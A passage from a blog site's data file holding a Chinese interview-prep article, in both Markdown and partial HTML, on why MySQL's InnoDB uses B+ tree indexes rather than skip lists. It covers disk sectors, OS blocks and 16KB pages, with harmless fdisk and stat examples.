需要维护 树的平衡\n\n为了维持B+树的平衡，在插入新的数据时，B+树会不断将进行 **数据页的 分裂**。\n\n维护平衡意味维护搜索的稳定性， 意味着着在搜索的时候，不管走哪个子树分支，搜索次数都差不了太多。\n\n#### 跳表 需要不太关心平衡问题\n\n跳表在新增数据 时，不太关心平衡的问题。跳表插入数据的时候，跟B+树不一样，是否新增层数，纯粹靠随机函数去决定。\n\n为什么B+Tree 采用Page作为 IO操作的单位？\n---------------------------\n\n前面讲到，B+Tree和跳表 IO 操作的单位 不同\n\n*   B+Tree 是page （16K） ,粗粒度IO\n\n*   跳表(Skip List) 是 node 节点 ，一个node 几十个字节 , 细粒度IO\n\n\n这是和 Mysql的存储介质有关系， Mysql的数据需要持久化存储， 并且需要事务机制保证持久性，所以，必须存储在磁盘上。\n\n### 内存和磁盘的访问速度对比\n\n机械硬盘的读写速度，大致如下\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/14.png)\n固态硬盘的读写速度，大致如下\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/15.png)\n内存的读写速度，和磁盘读写速度的对比\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/16.png)\n为什么磁盘慢，和磁盘的结构有关。\n\n### 机械硬盘的扇区（sector）\n\n机械硬盘的性能为啥那么慢？ 看看结构就知道：\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/17.png)\n机械磁盘上的每个磁道被等分为若干个弧段，这些弧段称之为扇区。\n\n如何在磁盘中读/写数据？ 需要 物理动作，去移动 “磁头” 到目标 扇区\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/18.png)\n机械磁盘的读写以扇区为基本单位。\n\n硬盘的物理读写以扇区为基本单位。通常情况下每个扇区的大小是 512 字节。linux 下可以使用 `fdisk -l` 了解扇区大小：\n\n```\n$ sudo /sbin/fdisk -l  \nDisk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors  \nUnits: sectors of 1 * 512 = 512 bytes  \nSector size (logical/physical): 512 bytes / 512 bytes  \nI/O size (minimum/optimal): 512 bytes / 512 bytes  \nDisklabel type: dos  \nDisk identifier: 0x7d9f5643  \n\n```\n\n其中 Sector size，就是扇区大小，本例中为 512 bytes。\n\n注意，扇区是磁盘物理层面的概念，不是操作系统的概率。\n\n操作系统是不直接与扇区交互的，而是与多个连续扇区组成的磁盘块交互。由于扇区是物理层面的概念，所以无法在系统中进行大小的更改。\n\n### 操作系统 IO 块 Block\n\n文件系统读写数据的最小单位，也叫磁盘簇，IO区块 BLOC。\n\n什么是IO 块 Block？ 扇区是磁盘最小的物理存储单元，操作系统将相邻的扇区组合在一起，形成一个块，对块进行管理。\n\n每个Block 磁盘块可以包括 2、4、8、16、32 或 64 个扇区。\n\n所以，Block 磁盘块是操作系统所使用的逻辑概念，而非磁盘的物理概念。\n\nBlock 磁盘块的大小可以通过命令 `stat /boot` 来查看：\n\n```\n$ sudo stat /boot  \n  File: /boot  \n  Size: 4096        Blocks: 8          IO Block: 4096   directory  \nDevice: 801h/2049d  Inode: 655361      Links: 3  \nAccess: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)  \nAccess: 2019-07-06 20:19:45.487160301 +0800  \nModify: 2019-07-06 20:19:44.835160301 +0800  \nChange: 2019-07-06 20:19:44.835160301 +0800  \n Birth: -  \n\n```\n\n其中 IO Block 就是磁盘块大小，本例中是 4096 Bytes，一般也是 4K。\n\n### Mysql的InnoDB Page 数据页\n\n磁盘IO是低性能的，如何提升性能， 最好是 减少IO， 基于时间局部性和空间局部性原理， 一次读取足够多的数据到内存。\n\nMysql的 InnoDB将数据划分为若干页，以Page 页作为磁盘与内存交互的基本单位，一般页的大小为16KB。\n\nInnoDB，为了通过减少内存与磁盘的交互次数，把一次读取和写入的 数据量， 从4K 扩大到了16K，也就是一次操作 4个 OS Block，从而提升性能。\n\n这样的话，一次性至少读取1Page 页数据到内存中或者将1 Page页数据写入磁盘。而不是一个操作系统的block。\n\nPage 本质上就是一种典型的缓存设计思想，一般缓存的设计基本都是从时间局部性和空间局部性进行考量的：\n\n*   时间局部性：如果一条数据正在在被使用，那么在接下来一段时间内大概率还会再被使用。可以认为热点数据缓存都属于这种思路的实现。\n\n*   空间局部性：如果一条数据正在在被使用，那么存储在它附近的数据大概率也会很快被使用。InnoDB的数据页和操作系统的页缓存则是这种思路的体现。\n\n\nInnoDB Page 数据页的结构\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/19.png)\n一开始生成页的时候，并没有User Records这个部分.\n\n每当我们插⼊⼀条记录，都会从Free Space部分，也就是尚未使⽤的存储空间中申请⼀个记录⼤⼩的空间划分到User Records部分，当Free Space部分的空间全部被User Records部分替代掉之后，也就意味着这个页使⽤完了，如果还有新的记录插⼊的话，就需要去申请新的页了。\n\n### 一次IO一个page的优势\n\nMySQL的InnoDB存储引擎使用B+树而不是跳表，这是因为B+树一次IO一个page，大大节省了磁盘IO的操作。\n\n如果使用跳表，那么一个node节点一次io， 存储的性能 估计要下降1000倍以上。\n\n总结：Mysql的索引为什么使用B+树而不使用跳表\n-------------------------\n\n### B+树更适合磁盘IO\n\n**B+Tree**一个节点是一个page，是一种多叉树结构，每个结点都是一个16k的数据页，能存放较多索引信息。一次IO一个page，大大节省了磁盘IO的操作。\n\n**B+Tree**一个page 能存放较多索引信息 ，所以树的层数比较低， **三层**左右就可以存储`2kw`左右的数据也就是说查询一次数据，如果这些数据页都在磁盘里，那么最多需要查询**三次磁盘IO**。\n\n### 原生跳表不适合磁盘IO\n\n**跳表**是链表结构，一条数据一个结点，那么一个node节点一次磁盘io， 一个page 页规模的IO存储的性能 估计要下降1000倍以上。\n\n原生跳表 一个node存放一个 索引信息 ，所以树的层数比较高\n\n如果最底层要存放2kw数据，且每次查询都要能达到二分查找的效果，2kw大概在2的24次方 左右，\n\n所以，2kw数据的跳表大概高度在24层左右。 如果要进行查找，大概要进行 24次磁盘IO。\n\n> 这里讲的是原生跳表， 如果经过各种改进，那个不在此文讨论范围。\n\n所以，虽然在理论上，跳表的时间复杂度和B+树相同 ，但是：\n\n*   B+树更适合 磁盘IO， 更合适MYSQL。\n\n*   从反面来说， 跳表更适合内存IO， 更适合redis。\n\n\n","source":"_posts/Mysql为什么用B+树不用跳表.md","raw":"---\ntitle: Mysql为什么用B+树不用跳表\ndate: 2024-06-02 17:33:50\ntags: 数据库\ncategories: 面试\n---\n\n\n字节面试： Mysql为什么用B+树，不用跳表？\n========================\n\n**最近有小伙伴在蚂蚁、面试字节，都问到了相关的面试题，可以说是逢面必问。**\n\n小伙伴没有系统的去梳理和总结，所以支支吾吾的说了几句，面试官不满意，面试挂了。\n\n索引的作用和重要性\n---------\n\n索引是帮助MySQL高效获取数据的数据结构，注意，是帮助高性能的获取数据\n\n索引好比是一本书的目录，可以直接根据页码找到对应的内容，目的就是为了`加快数据库的查询速度`。\n\n*   索引是对数据库表中一列或多列的值进行排序的一种结构，使用索引可快速访问数据库表中的特定信息。\n\n*   索引是一种能帮助mysql提高了查询效率的数据结构：**索引数据结构**。\n\n\n索引的存储原理大致可以概括为一句话：**以空间换时间**。\n\n数据库在未添加索引, 进行查询的时候默认是进行全文搜索，也就是说有多少数据就进行多少次查询，然后找到相应的数据就把它们放到结果集中，直到全文扫描完毕。\n\n数据库添加了索引之后，通过索引快速找到数据在磁盘上的位置，可以快速的读取数据，而不同从头开始全表扫描。\n\n一般来说索引本身也很大，不可能全部存储在内存中，因此索引往往是存储在磁盘上的文件中的（可能存储在单独的索引文件中，也可能和数据一起存储在数据文件中）。\n\n### 索引的作用和重要性\n\n*   加快数据检索速度\n\n    索引允许数据库系统快速定位到符合查询条件的记录，从而显著提高查询操作的效率。\n\n*   降低数据库IO成本\n\n    通过索引，数据库在查询时需要读取的数据量减少，这样可以减少磁盘IO操作的次数和压力，进而提升整体的数据库性能。\n\n*   保证数据的完整性\n\n    索引可以包含唯一性约束，这有助于确保表中数据的唯一性，防止出现重复记录。\n\n*   加速表连接\n\n    在涉及多表查询时，索引可以帮助加速表与表之间的连接操作，实现表与表之间的参照完整性。\n\n*   优化排序和分组操作\n\n    当使用分组、排序等操作进行数据检索时，索引可以显著减少处理的数据量，从而提高这些操作的效率。\n\n\nB+数和跳表的整体结构\n-----------\n\n整体上，B+数和跳表 都是 链表+ 多级索引组合 的结构\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/1.png)\n\n#### 什么是MySQL中的B+Tree\n\nMySQL中的B+Tree 原理\n\n*   B+Tree一般由多个页、多层级组成，在MySQL中每个页 16 KB。\n\n*   主键索引的 B+ 树的叶子结点才是数据，非叶子结点（内节点）存放的是索引信息。\n\n*   上下层的页通过单指针相连。\n\n*   同一层级的相邻的数据页通过双指针相邻。\n\n*   B+Tree的结构\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/2.png)\n\n\n### B+Tree的查询过程\n\nB+Tree是由多个页组成的多层级结构，每个页16kb，对于主键索引来说，最末级的叶子节点放行数据，\n\n非叶子节点放的是索引信息(主键ID和页号),用于加速查询。\n\n我们想要查询数据5，会从顶层页的record开始，record里包含了主键Id和页号(页地址),\n\n顶层页 向左最小id是1，最右最小id是7，\n\n那id=5的数据如果存在，那必定在顶层页 左边箭头，于是顺着的record的页地址就到了`6号`数据页里，\n\n再判断id=5>4，所以肯定在右边的数据页里，于是加载`105号`数据页。\n\n在`105号数据页`里，虽然有多行数据，但也**不是挨个遍历的**，数据页内还有个**页目录**的信息，里边是有序的。\n\n所以，数据页内可以通过**二分查找**的方式加速查询行数据，于是找到id=5的数据行，完成查询。\n\n从上面可以看出，B+Tree利用了**空间换时间的**方式，**将查询时间复杂度从O(n)优化为O(lg(n))**。\n\n### B+Tree的优点和缺点\n\n*   B+Tree是一种平衡树结构，它具有根节点、内部节点和叶子节点。\n\n*   每个节点包含一定数量的键值对，键值对按键值大小有序排列。\n\n*   内部节点只包含键，叶子节点同时包含键和指向数据的指针。\n\n\n**B+Tree的优点**\n\n*   范围查询效率高：B+Tree支持范围查询，因为在B+Tree中，相邻的叶子节点是有序的，所以在查找范围内的数据时非常高效。\n\n*   事务支持：B+Tree是一种多版本并发控制（MVCC）友好的数据结构，适用于事务处理场景，能够保证事务的ACID属性。\n\n*   数据持久性：B+Tree的叶子节点包含所有数据，这意味着数据非常容易持久化到磁盘上，支持高可靠性和数据恢复。\n\n\n**B+Tree的缺点**\n\n*   **插入和删除开销较高**：由于B+Tree的平衡性质，插入和删除操作可能需要进行节点的分裂和合并，这会导致性能开销较大。\n\n*   高度不稳定：B+Tree的高度通常比较大，**可能需要多次磁盘I/O才**能访问叶子节点，对于某些特定查询可能效率不高。\n\n\n跳表\n--\n\n### 跳表的原理\n\n跳表是一种采用了用空间换时间思想的数据结构。\n\n跳表会随机地将一些节点提升到更高的层次，以创建一种逐层的数据结构，以提高操作的速度。\n\n### 跳表的结构\n\n跳表的做法就是给链表做索引，而且是分层索引，\n\n### 单层跳表\n\n单层跳表, 可以退化到一个链表\n\n查找的时间复杂度是 O（N）\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/3.png)\n### 两层跳表\n\n两层跳表 = 原始链表 + 一层索引\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/4.png)\n### 两层跳表查询\n\n如查询id=11的数据，我们先在上层遍历，依次判断1,6,12，\n\n很快就可以判断出11在6到12之间，\n\n第二步，然后往下一跳，进入原始链表，就可以在遍历6,7,8,9,10,11之后，确定id=11的位置。\n\n通过第一级索引，直接将查询范围从原来的1到11，缩小到现在的1,6,7,8,9,10,11。\n\n### 三层跳表\n\n三层跳表 = 原始链表 + 第一层索引 + 第二层索引\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/5.png)\n### 三层跳表查询\n\n如果还是查询id=11的数据，就只需要查询1,6,9,10,11就能找到，比两层的时候更快一些。\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/6.png)\n### 跳表查找的时间复杂度\n\n在一个单链表中查询某个数据的时间复杂度是 O(n)。也就是说，单层的跳表， 时间复杂度是 O(n)。\n\n跳表 就是 为链表 增加多级索引， 完成空间换时间， 实现 时间复杂度是 O(logn)。\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/7.png)\n这个时间复杂度的分析方法比较难想到。\n\n先问题分解一下，先来看这样一个问题，如果链表里有 n 个结点，会有多少级索引呢？\n\n在跳表中，假设每两个结点，会抽出一个结点作为上一级索引的结点。\n\n那么，索引有多少级，每一级有多少个node呢：\n\n*   第一级索引的结点个数大约就是 n/2，\n\n*   第二级索引的结点个数大约就是 n/4，\n\n*   第三级索引的结点个数大约就是 n/8，\n\n\n依次类推，也就是说，\n\n*   第 k 级索引的结点个数是第 k-1 级索引的结点个数的 1/2，\n\n*   那第 k级索引结点的个数就是 n/(2的k次方)。\n\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/8.png)\n假设索引有 h 级，最高级的索引有 2 个结点。\n\n通过上面的公式，我们可以得到 n/(2^h)=2，从而求得 h=log2n-1。\n\n如果包含原始链表这一层，整个跳表的高度就是 log2n。\n\n我们在跳表中查询某个数据的时候，如果每一层都要遍历 m 个结点，那在跳表中查询一个数据的时间复杂度就是 O(m\\*logn)。\n\n那m到底是多少呢?\n\n假设我们要查找的数据是 x，在第 k 级索引中，我们遍历到 y 结点之后，发现 x 大于 y，小于后面的结点 z，所以我们通过 y 的 down 指针，从第 k 级索引下降到第 k-1 级索引。\n\n在第 k-1 级索引中，y 和 z 之间只有 3 个结点（包含 y 和 z），所以，我们在 K-1 级索引中最多只需要遍历 3 个结点，依次类推，每一级索引都最多只需要遍历 3 个结点。\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/9.png)\n过上面的分析，我们得到 m=3，\n\n所以在跳表中查询任意数据的时间复杂度就是 O(logn)。\n\n这个查找的时间复杂度跟二分查找是一样的，这也体现了空间换时间的效率之高。\n\n### 跳表(Skip List)的优点和缺点\n\n跳表是一种多层级的数据结构，每一层都是一个有序链表，\n\n最底层包含所有数据，而上层包含的数据是下层的子集，通过跳跃节点快速定位目标数据。\n\n**跳表(Skip List)的优点**\n\n*   平均**查找时间较低**：跳表的查询时间复杂度为O(log n)，与平衡树结构相似，但实现起来较为简单。\n\n*   插入和删除操作相对较快：由于跳表不需要进行节点的频繁平衡调整，插入和删除操作的性能较好。\n\n\n**跳表(Skip List)的缺点**\n\n*   难以实现**事务和数据持久性**：跳表的更新操作可能涉及多个层级，实现事务和数据持久性要求更复杂。\n\n*   空间开销较大：跳表需要额外的指针来连接不同层级，占用的内存空间较多。\n\n\nB+Tree 和 跳表(Skip List) 的在数据结构上的区别\n---------------------------------\n\n都是 多级索引 +链表\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/10.png)\n### IO 操作的单位 不同\n\nB+Tree 是page （16K）\n\n跳表(Skip List) 是 node 节点 ，一个node 几十个字节\n\n### 树的高度 不同\n\n**B+树**是多叉树结构，每个结点都是一个`16k`的数据页，能存放较多索引信息。\n\n同样的数据，树的高度比较小。 三层B+左右就可以存储2kw左右的数据。\n\n如果，把三层B+树塞满，那大概需要2kw左右的数据。 也就是说查询一次数据，如果这些数据页都在磁盘里，那么**最多需要查询三次磁盘IO**。\n\n跳表是链表结构，一条数据一个结点，\n\n如果最底层要存放2kw数据，且每次查询都要能达到二分查找的效果，2kw大概在2的24次方 左右，\n\n所以，2kw数据的跳表大概高度在24层左右。 如果要一个节点要进行一次磁盘IO，大概要进行 24次。\n\nB+Tree 和 跳表(Skip List) 的新增数据区别\n------------------------------\n\n了解了二者的基本情况之后，接下来，对B+Tree 和 跳表(Skip List) 的数据插入进行对比。\n\nB+Tree和跳表的叶子层，都包含了所有的数据，且叶子层都是顺序的，适合用于范围查询。\n\n来看看，B+Tree和跳表新增和删除数据的差异\n\n### B+Tree 新增数据\n\n**场景1： 叶子结点和索引结点都没满**\n\nB+Tree 直接插入到叶子结点中就好了。\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/11.png)\n**场景2：叶子结点满了，但索引结点没满**\n\nB+Tree 需要拆分叶子结点，同时索引结点要增加新的索引信息。\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/12.png)\n**场景3：叶子结点满了，且索引结点也满了**\n\n叶子和索引结点都要拆分，同时往上还要再**加一层索引。**\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/13.png)\nB+树是一种多叉平衡二叉树，要维护各个分支的高度差距，不能太大，平衡意味着子树们的高度层级尽量一致（一般最多差一个层级）。\n\n为啥要平衡呢？平衡意味着在搜索的时候，不管走哪个子树分支，搜索次数都差不了太多。\n\n所以，为了维持B+树的平衡，在插入新的数据时，B+树会不断将进行 **数据页的 分裂**。\n\n### 跳表新增数据\n\n跳表同样也是很多层，新增一个数据时，最底层的链表需要插入数据，\n\n然后，考虑是否需要在上面几层中加入数据做索引 ？ 这个就靠**随机函数**了。\n\n例如: 如果跳表中插入数据id=6，且随机函数返回第三层（有25%的概率），那就需要在跳表的最底层到第三层都插入数据。\n\n跳表跟B+树不一样，跳表是否新增层数，纯粹靠随机函数，不太关心平衡的问题。\n\nB+Tree和跳表的在新增数据上的区别\n-------------------\n\n#### B+Tree 需要维护 树的平衡\n\n为了维持B+树的平衡，在插入新的数据时，B+树会不断将进行 **数据页的 分裂**。\n\n维护平衡意味维护搜索的稳定性， 意味着着在搜索的时候，不管走哪个子树分支，搜索次数都差不了太多。\n\n#### 跳表 需要不太关心平衡问题\n\n跳表在新增数据 时，不太关心平衡的问题。跳表插入数据的时候，跟B+树不一样，是否新增层数，纯粹靠随机函数去决定。\n\n为什么B+Tree 采用Page作为 IO操作的单位？\n---------------------------\n\n前面讲到，B+Tree和跳表 IO 操作的单位 不同\n\n*   B+Tree 是page （16K） ,粗粒度IO\n\n*   跳表(Skip List) 是 node 节点 ，一个node 几十个字节 , 细粒度IO\n\n\n这是和 Mysql的存储介质有关系， Mysql的数据需要持久化存储， 并且需要事务机制保证持久性，所以，必须存储在磁盘上。\n\n### 内存和磁盘的访问速度对比\n\n机械硬盘的读写速度，大致如下\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/14.png)\n固态硬盘的读写速度，大致如下\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/15.png)\n内存的读写速度，和磁盘读写速度的对比\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/16.png)\n为什么磁盘慢，和磁盘的结构有关。\n\n### 机械硬盘的扇区（sector）\n\n机械硬盘的性能为啥那么慢？ 看看结构就知道：\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/17.png)\n机械磁盘上的每个磁道被等分为若干个弧段，这些弧段称之为扇区。\n\n如何在磁盘中读/写数据？ 需要 物理动作，去移动 “磁头” 到目标 扇区\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/18.png)\n机械磁盘的读写以扇区为基本单位。\n\n硬盘的物理读写以扇区为基本单位。通常情况下每个扇区的大小是 512 字节。linux 下可以使用 `fdisk -l` 了解扇区大小：\n\n```\n$ sudo /sbin/fdisk -l  \nDisk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors  \nUnits: sectors of 1 * 512 = 512 bytes  \nSector size (logical/physical): 512 bytes / 512 bytes  \nI/O size (minimum/optimal): 512 bytes / 512 bytes  \nDisklabel type: dos  \nDisk identifier: 0x7d9f5643  \n\n```\n\n其中 Sector size，就是扇区大小，本例中为 512 bytes。\n\n注意，扇区是磁盘物理层面的概念，不是操作系统的概率。\n\n操作系统是不直接与扇区交互的，而是与多个连续扇区组成的磁盘块交互。由于扇区是物理层面的概念，所以无法在系统中进行大小的更改。\n\n### 操作系统 IO 块 Block\n\n文件系统读写数据的最小单位，也叫磁盘簇，IO区块 BLOC。\n\n什么是IO 块 Block？ 扇区是磁盘最小的物理存储单元，操作系统将相邻的扇区组合在一起，形成一个块，对块进行管理。\n\n每个Block 磁盘块可以包括 2、4、8、16、32 或 64 个扇区。\n\n所以，Block 磁盘块是操作系统所使用的逻辑概念，而非磁盘的物理概念。\n\nBlock 磁盘块的大小可以通过命令 `stat /boot` 来查看：\n\n```\n$ sudo stat /boot  \n  File: /boot  \n  Size: 4096        Blocks: 8          IO Block: 4096   directory  \nDevice: 801h/2049d  Inode: 655361      Links: 3  \nAccess: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)  \nAccess: 2019-07-06 20:19:45.487160301 +0800  \nModify: 2019-07-06 20:19:44.835160301 +0800  \nChange: 2019-07-06 20:19:44.835160301 +0800  \n Birth: -  \n\n```\n\n其中 IO Block 就是磁盘块大小，本例中是 4096 Bytes，一般也是 4K。\n\n### Mysql的InnoDB Page 数据页\n\n磁盘IO是低性能的，如何提升性能， 最好是 减少IO， 基于时间局部性和空间局部性原理， 一次读取足够多的数据到内存。\n\nMysql的 InnoDB将数据划分为若干页，以Page 页作为磁盘与内存交互的基本单位，一般页的大小为16KB。\n\nInnoDB，为了通过减少内存与磁盘的交互次数，把一次读取和写入的 数据量， 从4K 扩大到了16K，也就是一次操作 4个 OS Block，从而提升性能。\n\n这样的话，一次性至少读取1Page 页数据到内存中或者将1 Page页数据写入磁盘。而不是一个操作系统的block。\n\nPage 本质上就是一种典型的缓存设计思想，一般缓存的设计基本都是从时间局部性和空间局部性进行考量的：\n\n*   时间局部性：如果一条数据正在在被使用，那么在接下来一段时间内大概率还会再被使用。可以认为热点数据缓存都属于这种思路的实现。\n\n*   空间局部性：如果一条数据正在在被使用，那么存储在它附近的数据大概率也会很快被使用。InnoDB的数据页和操作系统的页缓存则是这种思路的体现。\n\n\nInnoDB Page 数据页的结构\n\n![](./2024/06/02/Mysql为什么用B+树不用跳表/19.png)\n一开始生成页的时候，并没有User Records这个部分.\n\n每当我们插⼊⼀条记录，都会从Free Space部分，也就是尚未使⽤的存储空间中申请⼀个记录⼤⼩的空间划分到User Records部分，当Free Space部分的空间全部被User Records部分替代掉之后，也就意味着这个页使⽤完了，如果还有新的记录插⼊的话，就需要去申请新的页了。\n\n### 一次IO一个page的优势\n\nMySQL的InnoDB存储引擎使用B+树而不是跳表，这是因为B+树一次IO一个page，大大节省了磁盘IO的操作。\n\n如果使用跳表，那么一个node节点一次io， 存储的性能 估计要下降1000倍以上。\n\n总结：Mysql的索引为什么使用B+树而不使用跳表\n-------------------------\n\n### B+树更适合磁盘IO\n\n**B+Tree**一个节点是一个page，是一种多叉树结构，每个结点都是一个16k的数据页，能存放较多索引信息。一次IO一个page，大大节省了磁盘IO的操作。\n\n**B+Tree**一个page 能存放较多索引信息 ，所以树的层数比较低， **三层**左右就可以存储`2kw`左右的数据也就是说查询一次数据，如果这些数据页都在磁盘里，那么最多需要查询**三次磁盘IO**。\n\n### 原生跳表不适合磁盘IO\n\n**跳表**是链表结构，一条数据一个结点，那么一个node节点一次磁盘io， 一个page 页规模的IO存储的性能 估计要下降1000倍以上。\n\n原生跳表 一个node存放一个 索引信息 ，所以树的层数比较高\n\n如果最底层要存放2kw数据，且每次查询都要能达到二分查找的效果，2kw大概在2的24次方 左右，\n\n所以，2kw数据的跳表大概高度在24层左右。 如果要进行查找，大概要进行 24次磁盘IO。\n\n> 这里讲的是原生跳表， 如果经过各种改进，那个不在此文讨论范围。\n\n所以，虽然在理论上，跳表的时间复杂度和B+树相同 ，但是：\n\n*   B+树更适合 磁盘IO， 更合适MYSQL。\n\n*   从反面来说， 跳表更适合内存IO， 更适合redis。\n\n\n","slug":"Mysql为什么用B+树不用跳表","published":1,"updated":"2024-06-02T10:39:17.654Z","comments":1,"layout":"post","photos":[],"_id":"clylh1rxy0009bsuh2fsd4t1p","content":"<h1 id=\"字节面试：-Mysql为什么用B-树，不用跳表？\"><a href=\"#字节面试：-Mysql为什么用B-树，不用跳表？\" class=\"headerlink\" title=\"字节面试： Mysql为什么用B+树，不用跳表？\"></a>字节面试： Mysql为什么用B+树，不用跳表？</h1><p><strong>最近有小伙伴在蚂蚁、面试字节，都问到了相关的面试题，可以说是逢面必问。</strong></p>\n<p>小伙伴没有系统的去梳理和总结，所以支支吾吾的说了几句，面试官不满意，面试挂了。</p>\n<h2 id=\"索引的作用和重要性\"><a href=\"#索引的作用和重要性\" class=\"headerlink\" title=\"索引的作用和重要性\"></a>索引的作用和重要性</h2><p>索引是帮助MySQL高效获取数据的数据结构，注意，是帮助高性能的获取数据</p>\n<p>索引好比是一本书的目录，可以直接根据页码找到对应的内容，目的就是为了<code>加快数据库的查询速度</code>。</p>\n<ul>\n<li><p>索引是对数据库表中一列或多列的值进行排序的一种结构，使用索引可快速访问数据库表中的特定信息。</p>\n</li>\n<li><p>索引是一种能帮助mysql提高了查询效率的数据结构：<strong>索引数据结构</strong>。</p>\n</li>\n</ul>\n<p>索引的存储原理大致可以概括为一句话：<strong>以空间换时间</strong>。</p>\n<p>数据库在未添加索引, 进行查询的时候默认是进行全文搜索，也就是说有多少数据就进行多少次查询，然后找到相应的数据就把它们放到结果集中，直到全文扫描完毕。</p>\n<p>数据库添加了索引之后，通过索引快速找到数据在磁盘上的位置，可以快速的读取数据，而不同从头开始全表扫描。</p>\n<p>一般来说索引本身也很大，不可能全部存储在内存中，因此索引往往是存储在磁盘上的文件中的（可能存储在单独的索引文件中，也可能和数据一起存储在数据文件中）。</p>\n<h3 id=\"索引的作用和重要性-1\"><a href=\"#索引的作用和重要性-1\" class=\"headerlink\" title=\"索引的作用和重要性\"></a>索引的作用和重要性</h3><ul>\n<li><p>加快数据检索速度</p>\n<p>索引允许数据库系统快速定位到符合查询条件的记录，从而显著提高查询操作的效率。</p>\n</li>\n<li><p>降低数据库IO成本</p>\n<p>通过索引，数据库在查询时需要读取的数据量减少，这样可以减少磁盘IO操作的次数和压力，进而提升整体的数据库性能。</p>\n</li>\n<li><p>保证数据的完整性</p>\n<p>索引可以包含唯一性约束，这有助于确保表中数据的唯一性，防止出现重复记录。</p>\n</li>\n<li><p>加速表连接</p>\n<p>在涉及多表查询时，索引可以帮助加速表与表之间的连接操作，实现表与表之间的参照完整性。</p>\n</li>\n<li><p>优化排序和分组操作</p>\n<p>当使用分组、排序等操作进行数据检索时，索引可以显著减少处理的数据量，从而提高这些操作的效率。</p>\n</li>\n</ul>\n<h2 id=\"B-数和跳表的整体结构\"><a href=\"#B-数和跳表的整体结构\" class=\"headerlink\" title=\"B+数和跳表的整体结构\"></a>B+数和跳表的整体结构</h2><p>整体上，B+数和跳表 都是 链表+ 多级索引组合 的结构</p>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/1.png\"></p>\n<h4 id=\"什么是MySQL中的B-Tree\"><a href=\"#什么是MySQL中的B-Tree\" class=\"headerlink\" title=\"什么是MySQL中的B+Tree\"></a>什么是MySQL中的B+Tree</h4><p>MySQL中的B+Tree 原理</p>\n<ul>\n<li><p>B+Tree一般由多个页、多层级组成，在MySQL中每个页 16 KB。</p>\n</li>\n<li><p>主键索引的 B+ 树的叶子结点才是数据，非叶子结点（内节点）存放的是索引信息。</p>\n</li>\n<li><p>上下层的页通过单指针相连。</p>\n</li>\n<li><p>同一层级的相邻的数据页通过双指针相邻。</p>\n</li>\n<li><p>B+Tree的结构</p>\n</li>\n</ul>\n<p><img src=\"/./2024/06/02/Mysql%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8B+%E6%A0%91%E4%B8%8D%E7%94%A8%E8%B7%B3%E8%A1%A8/2.png\"></p>\n<h3 id=\"B-Tree的查询过程\"><a href=\"#B-Tree的查询过程\" class=\"headerlink\" title=\"B+Tree的查询过程\"></a>B+Tree的查询过程</h3><p>B+Tree是由多个页组成的多层级结构，每个页16kb，对于主键索引来说，最末级的叶子节点放行数据，</p>\n<p>非叶子节点放的是索引信息(主键ID和页号),用于加速查询。</p>\n<p>我们想要查询数据5，会从顶层页的record开始，record里包含了主键Id和页号(页地址),</p>\n<p>顶层页 向左最小id是1，最右最小id是7，</p>\n<p>那id&#x3D;5的数据如果存在，那必定在顶层页 左边箭头，于是顺着的record的页地址就到了<code>6号</code>数据页里，</p>\n<p>再判断id&#x3D;5&gt;4，所以肯定在右边的数据页里，于是加载<code>105号</code>数据页。</p>\n<p>在<code>105号数据页</code>里，虽然有多行数据，但也<strong>不是挨个遍历的</strong>，数据页内还有个<strong>页目录</strong>的信息，里边是有序的。</p>\n<p>所以，数据页内可以通过<strong>二分查找</strong>的方式加速查询行数据，于是找到id&#x3D;5的数据行，完成查询。</p>\n<p>从上面可以看出，B+Tree利用了<strong>空间换时间的</strong>方式，**将查询时间复杂度从O(n)优化为O(lg(n))**。</p>\n<h3 id=\"B-Tree的优点和缺点\"><a href=\"#B-Tree的优点和缺点\" class=\"headerlink\" title=\"B+Tree的优点和缺点\"></a>B+Tree的优点和缺点</h3><ul>\n<li><p>B+Tree是一种平衡树结构，它具有根节点、内部节点和叶子节点。</p>\n</li>\n<li><p>每个节点包含一定数量的键值对，键值对按键值大小有序排列。</p>\n</li>\n<li><p>内部节点只包含键，叶子节点同时包含键和指向数据的指针。</p>\n</li>\n</ul>\n<p><strong>B+Tree的优点</strong></p>\n<ul>\n<li><p>范围查询效率高：B+Tree支持范围查询，因为在B+Tree中，相邻的叶子节点是有序的，所以在查找范围内的数据时非常高效。</p>\n</li>\n<li><p>事务支持：B+Tree是一种多版本并发控制（MVCC）友好的数据结构，适用于事务处理场景，能够保证事务的ACID属性。</p>\n</li>\n<li><p>数据持久性：B+Tree的叶子节点包含所有数据，这意味着数据非常容易持久化到磁盘上，支持高可靠性和数据恢复。</p>\n</li>\n</ul>\n<p><strong>B+Tree的缺点</strong></p>\n<ul>\n<li><p><strong>插入和删除开销较高</strong>：由于B+Tree的平衡性质，插入和删